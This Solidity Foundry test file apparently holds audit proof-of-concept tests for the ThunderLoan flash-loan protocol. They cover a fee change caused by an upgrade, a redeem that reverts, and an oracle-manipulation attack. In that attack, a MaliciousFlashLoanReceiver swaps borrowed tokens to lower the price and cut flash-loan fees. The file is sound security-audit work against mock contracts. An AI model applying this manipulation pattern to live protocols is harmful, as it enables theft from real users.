// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoanTest, ThunderLoan } from "../unit/ThunderLoanTest.t.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";

contract ProofOfCodes is ThunderLoanTest {
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }

    function testCanManipuleOracleToIgnoreFees() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        weth = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        pf.createPool(address(tokenA));
        address tswapPool = pf.getPool(address(tokenA));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 1. Fund Tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);

        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        // We are depositing 100 WETH & 100 USDC into Tswap
        // so the price will be 1 WETH == 1 USDC
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        // 2. Fund ThunderLoan
        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.stopPrank();

        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(thunderLoan), 100e18);
        thunderLoan.deposit(tokenA, 100e18);
        vm.stopPrank();

        // 3. Attack
        // TSwap has 100 WETH & 100 tokenA
        // ThunderLoan has 1,000 tokenA
        // If we borrow 50 tokenA -> swap it for WETH (tank the price) -> borrow another 50 tokenA (do something) ->
        // repay both
        // We pay drastically lower fees

        // here is how much we'd pay normally
        uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(tokenA, 100e18);

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr =
            new MaliciousFlashLoanReceiver(address(tswapPool), address(tokenA), address(weth));
        vm.startPrank(user);
        tokenA.mint(address(flr), AMOUNT);
        tokenA.mint(address(flr), 50e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 calculatedFeeAttack = flr.feeOne() + flr.feeTwo();
        console.log("Normal fee: %s", calculatedFeeNormal);
        console.log("Attack fee: %s", calculatedFeeAttack);
        assert(calculatedFeeAttack < calculatedFeeNormal);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    bool attacked;
    BuffMockTSwap pool;
    uint256 public feeOne;
    uint256 public feeTwo;
    IERC20 public weth;
    IERC20 public tokenA;

    constructor(address tswapPool, address token, address _weth) {
        pool = BuffMockTSwap(tswapPool);
        tokenA = IERC20(token);
        weth = IERC20(_weth);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 expected = pool.getInputAmountBasedOnOutput(50e18, 100e18, 100e18);
            IERC20(tokenA).approve(address(pool), expected);
            pool.swapExactInput(tokenA, weth, expected, uint64(block.timestamp));
            IERC20(token).approve(msg.sender, amount + fee);
            IThunderLoan(msg.sender).repay(token, amount + fee);
        } else {
            feeTwo = fee;
            IERC20(token).approve(msg.sender, amount + fee);
            IThunderLoan(msg.sender).repay(token, amount + fee);
        }
        return true;
    }
}
